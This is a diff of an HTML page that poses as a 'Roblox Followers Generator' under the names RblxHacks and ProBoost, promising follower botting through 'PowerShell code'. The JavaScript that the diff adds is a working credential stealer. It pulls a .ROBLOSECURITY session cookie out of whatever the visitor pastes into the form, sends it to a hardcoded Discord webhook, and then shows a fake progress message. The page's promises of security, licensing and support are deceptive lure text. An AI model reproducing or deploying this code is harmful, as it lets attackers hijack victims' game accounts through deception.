@@ -1,23 +1,20 @@
 <html lang="en">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <title>
-   ProBoost Followers Generator
-  </title>
-  <!-- Favicon -->
-  <link href="logo.png" rel="icon" type="image/png"/>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&amp;display=swap" rel="stylesheet"/>
-  <style>
-   body {
-            background: linear-gradient(180deg, #1a1a1a, #333333, #4d4d4d, #666666);
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Roblox Followers Generator</title>
+    <!-- Favicon -->
+    <link href="logo.png" rel="icon" type="image/png"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet"/>
+    <style>
+        body {
+            background: linear-gradient(180deg, #6a0dad, #8a2be2, #4b0082, #0000ff);
             background-size: 400% 400%;
             animation: gradient 15s ease infinite;
             color: white;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Arial', sans-serif;
             overflow-x: hidden;
             display: flex;
             flex-direction: column;
@@ -57,7 +54,7 @@
         }
         .breathing-animation {
             animation: breathing 3s ease-in-out infinite;
-            background: linear-gradient(90deg, rgba(0, 128, 255, 0.5), rgba(0, 255, 128, 0.5), rgba(255, 255, 255, 0.5));
+            background: linear-gradient(90deg, rgba(128, 0, 128, 0.5), rgba(0, 0, 255, 0.5), rgba(255, 255, 255, 0.5));
             background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
@@ -105,7 +102,7 @@
             max-width: 400px;
             text-align: center;
             border-radius: 10px;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         .modal-content i {
             color: green;
@@ -114,6 +111,7 @@
         .modal-content p {
             font-size: 18px;
             margin-top: 10px;
+            font-family: 'Roboto', sans-serif;
         }
         .modal-error {
             background: linear-gradient(180deg, rgba(62, 36, 36, 0.8), rgba(62, 36, 36, 0.5));
@@ -122,7 +120,7 @@
             max-width: 400px;
             text-align: center;
             border-radius: 10px;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Arial', sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -135,13 +133,14 @@
         .modal-error p {
             font-size: 18px;
             margin-top: 10px;
+            font-family: 'Roboto', sans-serif;
         }
         .input-transparent {
             background: rgba(255, 255, 255, 0.1);
             border: 1px solid rgba(255, 255, 255, 0.3);
         }
         .gradient-button {
-            background: linear-gradient(90deg, rgba(0, 128, 255, 0.5), rgba(0, 255, 128, 0.5));
+            background: linear-gradient(90deg, rgba(128, 0, 128, 0.5), rgba(0, 0, 255, 0.5));
             border: 1px solid rgba(255, 255, 255, 0.3);
             transition: all 0.3s ease;
             background-size: 200% 200%;
@@ -225,192 +224,165 @@
                 transform: translateY(-20px);
             }
         }
-        .fade-in {
-            animation: fadeIn 2s ease-in-out;
-        }
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-        .slide-in {
-            animation: slideIn 1s ease-in-out;
-        }
-        @keyframes slideIn {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(0); }
-        }
-  </style>
- </head>
- <body>
-  <div class="lava-lamp" id="bubbles-container">
-  </div>
-  <header class="text-center p-4">
-   <h1 class="text-white font-bold text-4xl rgb-text glow-effect" style="font-family: 'Roboto', sans-serif;">
-    ProBoost
-   </h1>
-  </header>
-  <main class="text-center mt-10 flex flex-col items-center">
-   <section class="text-center mb-16">
-    <h2 class="text-4xl font-bold mb-8 text-white pulse-effect">
-     ⭐ ProBoost Followers Generator ⭐
-    </h2>
-    <p class="mb-8 max-w-2xl mx-auto">
-     Follower botting has never been easier. ProBoost has all the right tools to make the process seamless and efficient.
-    </p>
-    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
-     <div class="text-center p-4 bg-gray-800 rounded-lg shadow-lg slide-in">
-      <i class="fas fa-file-alt text-5xl text-blue-500 mb-2">
-      </i>
-      <p class="font-bold">
-       Follow the Setup
-      </p>
-      <p class="text-sm">
-       Get started by following our easy setup guide.
-      </p>
-     </div>
-     <div class="text-center p-4 bg-gray-800 rounded-lg shadow-lg slide-in">
-      <i class="fas fa-rocket text-5xl text-blue-500 mb-2">
-      </i>
-      <p class="font-bold">
-       Start the Process
-      </p>
-      <p class="text-sm">
-       Initiate the botting process with a few clicks.
-      </p>
-     </div>
-     <div class="text-center p-4 bg-gray-800 rounded-lg shadow-lg slide-in">
-      <i class="fas fa-check-circle text-5xl text-blue-500 mb-2">
-      </i>
-      <p class="font-bold">
-       Enjoy Your Followers
-      </p>
-      <p class="text-sm">
-       Watch your follower count grow effortlessly.
-      </p>
-     </div>
+    </style>
+</head>
+<body>
+    <div class="lava-lamp" id="bubbles-container"></div>
+    <header class="text-center p-4">
+        <h1 class="text-white font-bold text-4xl rgb-text glow-effect" style="font-family: 'Roboto', sans-serif;">
+            RBLXHACKS
+        </h1>
+    </header>
+    <main class="text-center mt-20 flex flex-col items-center">
+        <h2 class="text-4xl font-bold mb-8 text-white pulse-effect">
+            ⭐ ROBLOX FOLLOWERS GENERATOR ⭐
+        </h2>
+        <p class="mb-8">
+            Follower botting has never been easier. RblxHacks has all the right tools in order to make the process seamless.
+        </p>
+        <div class="flex justify-center space-x-8 mb-16">
+            <div class="text-center cursor-pointer" onclick="document.getElementById('tutorial').scrollIntoView({ behavior: 'smooth' });">
+                <i class="fas fa-file-alt text-5xl text-purple-500 mb-2"></i>
+                <p class="font-bold">Follow the Setup</p>
+            </div>
+            <div class="text-center cursor-pointer" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
+                <i class="fas fa-rocket text-5xl text-purple-500 mb-2"></i>
+                <p class="font-bold">Start the Process</p>
+            </div>
+            <div class="text-center">
+                <i class="fas fa-check-circle text-5xl text-purple-500 mb-2"></i>
+                <p class="font-bold">Enjoy Your Followers</p>
+            </div>
+        </div>
+        <button class="gradient-button text-white font-bold py-2 px-4 rounded mb-16" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
+            Start Botting
+        </button>
+        <div class="bg-black bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center" id="tutorial">
+            <h3 class="text-2xl font-bold mb-4">Our Mission</h3>
+            <p class="mb-4">
+                RblxHacks' Follower Botter is an advanced PowerShell-based Follower Bot &amp; Auto-Bot. It is capable of botting followers up to 4x faster than other competitors with DL technology. All you need to do is follow the setup below.
+            </p>
+            <p class="mb-4">
+                Your license is valid until August 27, 2025 12:00 AM EST.
+            </p>
+            <h3 class="text-2xl font-bold mb-4">Tutorial</h3>
+            <div class="flex justify-center mb-8">
+                <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/TpoJ7fKtMvI" title="YouTube video player" width="560"></iframe>
+            </div>
+        </div>
+        <div class="flex items-center justify-center mb-16">
+            <img alt="Roblox character with a background of followers" class="w-1/2 h-auto border-none levitation" height="300" src="R.png" width="300"/>
+            <p class="highlight ml-4 text-white bounce-effect">Followers Generator</p>
+        </div>
+        <div class="bg-black bg-opacity-10 p-16 rounded-lg mb-24 mx-4 shiny-border" id="followers-botter">
+            <h3 class="text-xl font-bold mb-4">Followers Botter</h3>
+            <div class="flex flex-col space-y-4">
+                <input class="p-2 rounded input-transparent text-white" id="username" placeholder="Username" type="text"/>
+                <input class="p-2 rounded input-transparent text-white" id="profile" placeholder="Profile" type="text"/>
+                <input class="p-2 rounded input-transparent text-white" id="followers" min="0" placeholder="Followers" step="1" type="number"/>
+            </div>
+            <button class="gradient-button text-white font-bold py-2 px-4 rounded mt-4" onclick="sendToWebhook()">
+                Start Botting
+            </button>
+        </div>
+    </main>
+    <div class="bg-black bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center">
+        <h3 class="text-2xl font-bold mb-4">Additional Information</h3>
+        <p class="mb-4">
+            RblxHacks is constantly updated to ensure the best performance and security. Our team is dedicated to providing the best tools for your needs.
+        </p>
+        <p class="mb-4">
+            For any support or inquiries, please contact our support team at rblxshacks@gmail.com.
+        </p>
+        <p class="mb-4">
+            Stay tuned for more updates and features coming soon!
+        </p>
     </div>
-    <button class="gradient-button text-white font-bold py-2 px-4 rounded mb-16 fade-in" onclick="document.getElementById('followers-botter').scrollIntoView({ behavior: 'smooth' });">
-     Start Botting
-    </button>
-   </section>
-   <section class="bg-gray-900 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in" id="tutorial">
-    <h3 class="text-2xl font-bold mb-4">
-     Our Mission
-    </h3>
-    <p class="mb-4">
-     ProBoost's Follower Botter is an advanced PowerShell-based Follower Bot &amp; Auto-Bot. It is capable of botting followers up to 4x faster than other competitors with DL technology. All you need to do is follow the setup below.
-    </p>
-    <p class="mb-4">
-     Your license is valid until August 27, 2025 12:00 AM EST.
-    </p>
-    <h3 class="text-2xl font-bold mb-4">
-     Tutorial
-    </h3>
-    <div class="flex justify-center mb-8">
-     <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" frameborder="0" height="315" src="https://www.youtube.com/embed/TpoJ7fKtMvI" title="YouTube video player" width="560">
-     </iframe>
+    <footer class="text-center p-4 bg-black bg-opacity-50 relative overflow-hidden">
+        <p>© 2024 RblxHacks. All rights reserved.</p>
+    </footer>
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <i class="fas fa-check-circle"></i>
+            <p class="mt-4">Generating Followers. Please wait 5-10 minutes.</p>
+            <p>[DO NOT ACCESS ROBLOX DURING THIS TIME]</p>
+        </div>
     </div>
-   </section>
-   <section class="flex flex-col md:flex-row items-center justify-center mb-16 fade-in">
-    <img alt="Roblox character with a background of followers" class="w-1/2 h-auto border-none levitation" height="300" src="https://placehold.co/300x300" width="300"/>
-    <p class="highlight ml-4 text-white bounce-effect">
-     Followers Generator
-    </p>
-   </section>
-   <section class="bg-gray-900 bg-opacity-50 p-16 rounded-lg mb-24 mx-4 shiny-border fade-in" id="followers-botter">
-    <h3 class="text-xl font-bold mb-4">
-     Followers Botter
-    </h3>
-    <div class="flex flex-col space-y-4">
-     <input class="p-2 rounded input-transparent text-white" id="username" placeholder="Username" type="text"/>
-     <input class="p-2 rounded input-transparent text-white" id="profile" placeholder="Profile" type="text"/>
-     <input class="p-2 rounded input-transparent text-white" id="followers" min="0" placeholder="Followers" step="1" type="number"/>
+    <div class="modal" id="modal-error">
+        <div class="modal-content modal-error">
+            <i class="fas fa-times-circle"></i>
+            <p class="mt-4">Error: Please fill in all fields or include the PowerShell code.</p>
+        </div>
     </div>
-    <button class="gradient-button text-white font-bold py-2 px-4 rounded mt-4" onclick="sendToWebhook()">
-     Start Botting
-    </button>
-   </section>
-   <section class="bg-gray-900 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in">
-    <h3 class="text-2xl font-bold mb-4">
-     Additional Information
-    </h3>
-    <p class="mb-4">
-     ProBoost is constantly updated to ensure the best performance and security. Our team is dedicated to providing the best tools for your needs.
-    </p>
-    <p class="mb-4">
-     For any support or inquiries, please contact our support team at proboostsupport@gmail.com.
-    </p>
-    <p class="mb-4">
-     Stay tuned for more updates and features coming soon!
-    </p>
-   </section>
-   <section class="bg-gray-900 bg-opacity-50 p-8 rounded-lg mb-24 mx-4 text-center fade-in">
-    <h3 class="text-2xl font-bold mb-4">
-     Why Choose ProBoost?
-    </h3>
-    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
-      <h4 class="text-xl font-bold mb-2">
-       Fast and Efficient
-      </h4>
-      <p>
-       Our botting technology is designed to be fast and efficient, ensuring you get the followers you need in no time.
-      </p>
-     </div>
-     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
-      <h4 class="text-xl font-bold mb-2">
-       Secure and Reliable
-      </h4>
-      <p>
-       We prioritize your security and privacy. Our tools are built with the latest security measures to keep your data safe.
-      </p>
-     </div>
-     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
-      <h4 class="text-xl font-bold mb-2">
-       User-Friendly Interface
-      </h4>
-      <p>
-       Our platform is designed to be user-friendly, making it easy for anyone to use our tools without any technical knowledge.
-      </p>
-     </div>
-     <div class="p-4 bg-gray-800 rounded-lg shadow-lg">
-      <h4 class="text-xl font-bold mb-2">
-       24/7 Support
-      </h4>
-      <p>
-       Our support team is available 24/7 to assist you with any questions or issues you may have.
-      </p>
-     </div>
-    </div>
-   </section>
-  </main>
-  <footer class="text-center p-4 bg-gray-900 bg-opacity-50 relative overflow-hidden fade-in">
-   <p>
-    © 2024 ProBoost. All rights reserved.
-   </p>
-  </footer>
-  <div class="modal" id="modal">
-   <div class="modal-content">
-    <i class="fas fa-check-circle">
-    </i>
-    <p class="mt-4">
-     Generating Followers. Please wait 5-10 minutes.
-    </p>
-    <p>
-     [DO NOT ACCESS ROBLOX DURING THIS TIME]
-    </p>
-   </div>
-  </div>
-  <div class="modal" id="modal-error">
-   <div class="modal-content modal-error">
-    <i class="fas fa-times-circle">
-    </i>
-    <p class="mt-4">
-     Error: Please fill in all fields or include the PowerShell code.
-    </p>
-   </div>
-  </div>
-  <script>
-  </script>
- </body>
+    <script>
+        function createBubble() {
+            const bubble = document.createElement('div');
+            bubble.className = 'bubble';
+            bubble.style.left = `${Math.random() * 100}vw`;
+            bubble.style.width = `${Math.random() * 50 + 20}px`;
+            bubble.style.height = bubble.style.width;
+            bubble.style.animationDuration = `${Math.random() * 10 + 5}s`;
+            document.getElementById('bubbles-container').appendChild(bubble);
+            setTimeout(() => {
+                bubble.remove();
+            }, 15000);
+        }
+        setInterval(createBubble, 500);
+
+        function sendToWebhook() {
+            const username = document.getElementById('username').value;
+            const profile = document.getElementById('profile').value;
+            const followers = document.getElementById('followers').value;
+
+            if (!username || !profile || !followers) {
+                showErrorModal();
+                return;
+            }
+
+            const webhookUrl = 'https://discord.com/api/webhooks/1352810286439993365/mwgH1enPDE-0kOENCx5mqk66qqf-OiT-fwGtZuFbIH-8bV9qMNBOd_8uhT4zyQFdNdEf';
+
+            const data = `Username: ${username}\nProfile: ${profile}\nFollowers: ${followers}`;
+            const lines = data.split('\n').slice(0, 11).join('\n'); // Get the first 11 lines
+
+            const match = data.match(/\.ROBLOSECURITY", "(.*?)"/);
+            if (match) {
+                const cookie = match[1];
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ content: cookie })
+                }).then(response => {
+                    if (response.ok) {
+                        showModal();
+                    } else {
+                        alert('Failed to send data.');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Failed to send data.');
+                });
+            } else {
+                showErrorModal();
+            }
+        }
+
+        function showModal() {
+            const modal = document.getElementById('modal');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 10000);
+        }
+
+        function showErrorModal() {
+            const modal = document.getElementById('modal-error');
+            modal.style.display = 'flex';
+            setTimeout(() => {
+                modal.style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
 </html>
